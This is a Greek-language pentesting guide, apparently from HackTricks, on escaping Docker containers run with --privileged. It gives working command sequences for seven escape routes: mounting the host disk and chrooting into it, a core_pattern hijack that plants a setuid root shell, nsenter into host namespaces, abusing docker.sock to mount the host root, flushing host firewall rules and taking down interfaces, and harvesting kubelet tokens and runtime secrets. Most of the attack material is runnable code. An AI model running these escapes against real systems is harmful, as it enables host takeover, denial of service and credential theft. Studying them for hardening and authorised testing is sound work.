# Απόδραση από `--privileged` Containers

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Ένα container που εκκινεί με `--privileged` δεν είναι το ίδιο με ένα κανονικό container που έχει μία ή δύο επιπλέον permissions. Στην πράξη, το `--privileged` καταργεί ή αποδυναμώνει αρκετές από τις προεπιλεγμένες runtime protections που συνήθως κρατούν το workload μακριά από επικίνδυνους πόρους του host. Το ακριβές αποτέλεσμα εξακολουθεί να εξαρτάται από το runtime και τον host, αλλά για το Docker το συνηθισμένο αποτέλεσμα είναι:

- εκχωρούνται όλα τα capabilities
- καταργούνται οι περιορισμοί του device cgroup
- πολλά kernel filesystems παύουν να προσαρτώνται ως read-only
- εξαφανίζονται τα προεπιλεγμένα masked procfs paths
- απενεργοποιείται το seccomp filtering
- απενεργοποιείται το AppArmor confinement
- απενεργοποιείται το SELinux isolation ή αντικαθίσταται από ένα πολύ ευρύτερο label

Η σημαντική συνέπεια είναι ότι ένα privileged container συνήθως **δεν** χρειάζεται ένα subtle kernel exploit. Σε πολλές περιπτώσεις μπορεί απλώς να αλληλεπιδράσει απευθείας με devices του host, host-facing kernel filesystems ή runtime interfaces και στη συνέχεια να κάνει pivot σε shell του host.

## Τι Δεν Αλλάζει Αυτόματα το `--privileged`

Το `--privileged` **δεν** κάνει αυτόματα join στα PID, network, IPC ή UTS namespaces του host. Ένα privileged container μπορεί να εξακολουθεί να έχει private namespaces. Αυτό σημαίνει ότι ορισμένα escape chains απαιτούν μια επιπλέον προϋπόθεση, όπως:

- ένα host bind mount
- host PID sharing
- host networking
- ορατά devices του host
- writable proc/sys interfaces

Αυτές οι προϋποθέσεις συχνά είναι εύκολο να ικανοποιηθούν σε πραγματικές misconfigurations, αλλά εννοιολογικά είναι ξεχωριστές από το ίδιο το `--privileged`.

## Escape Paths

### 1. Mount Του Δίσκου Του Host Μέσω Exposed Devices

Ένα privileged container συνήθως βλέπει πολύ περισσότερα device nodes κάτω από το `/dev`. Αν το block device του host είναι ορατό, το απλούστερο escape είναι να το κάνει mount και να εκτελέσει `chroot` στο filesystem του host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Εάν το root partition δεν είναι προφανές, απαριθμήστε πρώτα τη διάταξη των block:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Αν η πρακτική προσέγγιση είναι να τοποθετήσετε ένα setuid helper σε ένα writable host mount αντί να χρησιμοποιήσετε `chroot`, θυμηθείτε ότι δεν υποστηρίζουν όλα τα filesystems το setuid bit. Ένας γρήγορος capability check από το host είναι:
```bash
mount | grep -v "nosuid"
```
Αυτό είναι χρήσιμο επειδή οι εγγράψιμες διαδρομές σε filesystems `nosuid` είναι πολύ λιγότερο ενδιαφέρουσες για κλασικές ροές εργασίας τύπου «τοποθέτησε ένα setuid shell και εκτέλεσέ το αργότερα».

Οι εξασθενημένες προστασίες που παραβιάζονται εδώ είναι:

- πλήρης έκθεση συσκευών
- ευρείες capabilities, ειδικά η `CAP_SYS_ADMIN`

Σχετικές σελίδες:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Κάνε Mount ή Επαναχρησιμοποίησε ένα Host Bind Mount και `chroot`

Αν το root filesystem του host είναι ήδη mounted μέσα στο container ή αν το container μπορεί να δημιουργήσει τα απαραίτητα mounts επειδή είναι privileged, ένα host shell συχνά απέχει μόνο ένα `chroot`:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Αν δεν υπάρχει bind mount του root του host αλλά είναι δυνατή η πρόσβαση στο storage του host, δημιουργήστε ένα:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Αυτό το path εκμεταλλεύεται:

- αποδυναμωμένους περιορισμούς mount
- πλήρεις capabilities
- απουσία περιορισμού MAC

Σχετικές σελίδες:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Εκμετάλλευση εγγράψιμου `/proc/sys` ή `/sys`

Μία από τις σημαντικότερες συνέπειες του `--privileged` είναι ότι οι προστασίες των procfs και sysfs γίνονται πολύ πιο αδύναμες. Αυτό μπορεί να εκθέσει interfaces του kernel που απευθύνονται στο host και κανονικά είναι masked ή προσαρτώνται ως read-only.

Ένα κλασικό παράδειγμα είναι το `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Άλλες διαδρομές υψηλής αξίας περιλαμβάνουν:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Αυτό το path καταχράται:

- missing masked paths
- missing read-only system paths

Σχετικές σελίδες:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Χρήση πλήρων capabilities για mount- ή namespace-based escape

Ένα privileged container αποκτά τα capabilities που συνήθως αφαιρούνται από τα standard containers, συμπεριλαμβανομένων των `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` και πολλών άλλων. Αυτό συχνά αρκεί για τη μετατροπή ενός local foothold σε host escape, μόλις υπάρχει κάποια άλλη exposed επιφάνεια.

Ένα απλό παράδειγμα είναι το mounting πρόσθετων filesystems και η χρήση namespace entry:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Αν γίνεται επίσης κοινή χρήση του host PID, το βήμα γίνεται ακόμη πιο σύντομο:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Αυτή η διαδρομή εκμεταλλεύεται:

- το προεπιλεγμένο privileged capability set
- την προαιρετική κοινή χρήση του host PID

Σχετικές σελίδες:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Διαφυγή μέσω Runtime Sockets

Ένα privileged container συχνά καταλήγει να έχει ορατά στοιχεία ή sockets της κατάστασης του host runtime. Αν ένα socket των Docker, containerd ή CRI-O είναι προσβάσιμο, η απλούστερη προσέγγιση είναι συχνά η χρήση του runtime API για την εκκίνηση ενός δεύτερου container με πρόσβαση στον host:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Για το containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Αυτή η διαδρομή εκμεταλλεύεται:

- την έκθεση του privileged runtime
- τα host bind mounts που δημιουργούνται μέσω του ίδιου του runtime

Σχετικές σελίδες:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Κατάργηση των παρενεργειών της Απομόνωσης Δικτύου

Το `--privileged` από μόνο του δεν συνδέει το container με το host network namespace, αλλά αν το container διαθέτει επίσης `--network=host` ή άλλη πρόσβαση στο host network, ολόκληρο το network stack γίνεται τροποποιήσιμο:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Αυτό δεν είναι πάντα ένα direct host shell, αλλά μπορεί να οδηγήσει σε denial of service, traffic interception ή πρόσβαση σε management services που είναι διαθέσιμα μόνο μέσω loopback.

Σχετικές σελίδες:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Ανάγνωση Host Secrets Και Runtime State

Ακόμα και όταν ένα καθαρό shell escape δεν είναι άμεσα εφικτό, τα privileged containers συχνά έχουν αρκετή πρόσβαση για να διαβάσουν host secrets, κατάσταση του kubelet, runtime metadata και filesystems γειτονικών containers:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Εάν το `/var` είναι mounted από το host ή οι runtime directories είναι ορατοί, αυτό μπορεί να αρκεί για lateral movement ή κλοπή cloud/Kubernetes credentials, ακόμη και πριν αποκτηθεί host shell.

Σχετικές σελίδες:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Έλεγχοι

Σκοπός των παρακάτω εντολών είναι να επιβεβαιωθεί ποιες privileged-container escape families είναι άμεσα εφικτές.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Τι είναι ενδιαφέρον εδώ:

- ένα πλήρες σύνολο capabilities, ειδικά το `CAP_SYS_ADMIN`
- writable έκθεση των proc/sys
- ορατές συσκευές του host
- απουσία seccomp και MAC confinement
- runtime sockets ή bind mounts του root του host

Οποιοδήποτε από αυτά μπορεί να επαρκεί για post-exploitation. Αρκετά μαζί συνήθως σημαίνουν ότι το container απέχει λειτουργικά μία ή δύο εντολές από την παραβίαση του host.

## Σχετικές σελίδες

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
